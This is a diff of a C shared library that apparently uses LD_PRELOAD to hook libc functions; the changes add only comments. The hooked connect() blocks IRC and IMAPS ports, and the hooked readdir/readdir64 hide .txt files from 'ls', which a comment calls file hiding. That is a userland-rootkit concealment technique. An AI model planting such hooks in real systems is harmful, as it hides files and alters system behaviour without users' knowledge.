@@ -569,23 +569,23 @@ int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) {
         original_connect = dlsym(RTLD_NEXT, "connect");
     }
 
-    int port = -1;
+    int port = -1; // to block the ports
     char ip[INET6_ADDRSTRLEN] = "unknown";
 
     if (addr->sa_family == AF_INET) {
-        struct sockaddr_in *addr_in = (struct sockaddr_in *)addr;
+        struct sockaddr_in *addr_in = (struct sockaddr_in *)addr; // for IPv4 addresses
         port = ntohs(addr_in->sin_port);
-        inet_ntop(AF_INET, &addr_in->sin_addr, ip, sizeof(ip));
+        inet_ntop(AF_INET, &addr_in->sin_addr, ip, sizeof(ip)); 
     } else if (addr->sa_family == AF_INET6) {
-        struct sockaddr_in6 *addr_in6 = (struct sockaddr_in6 *)addr;
+        struct sockaddr_in6 *addr_in6 = (struct sockaddr_in6 *)addr; //for IPv6 addresses
         port = ntohs(addr_in6->sin6_port);
         inet_ntop(AF_INET6, &addr_in6->sin6_addr, ip, sizeof(ip));
     } else {
-        printf("[INTERNET_ACCESS_BLOCKED] Unknown address family (%d)\n", addr->sa_family);
+        printf("[INTERNET_ACCESS_BLOCKED] Unknown address family (%d)\n", addr->sa_family); // error message for display
         return original_connect(sockfd, addr, addrlen);
     }
 
-    int blocked_ports[] = {6667, 6697, 993};
+    int blocked_ports[] = {6667, 6697, 993}; // blocked ports for apps
     int should_block = 0;
 
     for (int i = 0; i < sizeof(blocked_ports) / sizeof(blocked_ports[0]); i++) {
@@ -631,7 +631,7 @@ int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) {
 
 //####### READDIR #######
 // Hijack ls command to not show .txt files, file hiding
-static int ends_with_txt(const char *str) {
+static int ends_with_txt(const char *str) { // for identifying .txt files
     if (!str) return 0;
     size_t len = strlen(str);
     if (len < 4) return 0;
@@ -648,7 +648,7 @@ struct dirent *readdir(DIR *dirp) {
     struct dirent *entry;
     while ((entry = orig_readdir(dirp)) != NULL) {
         if (ends_with_txt(entry->d_name)) {
-            // skip this entry
+            // skip this entry with continue
             continue;
         }
         return entry;
@@ -656,7 +656,7 @@ struct dirent *readdir(DIR *dirp) {
     return NULL;
 }
 
-// Hook readdir64 similarly
+// Hook readdir64 similarly (must also be blocked in addition to readdir because of different versions)
 struct dirent64 *readdir64(DIR *dirp) {
     static orig_readdir64_f_type orig_readdir64 = NULL;
     if (!orig_readdir64) {
@@ -666,6 +666,7 @@ struct dirent64 *readdir64(DIR *dirp) {
     struct dirent64 *entry;
     while ((entry = orig_readdir64(dirp)) != NULL) {
         if (ends_with_txt(entry->d_name)) {
+            // skip again
             continue;
         }
         return entry;
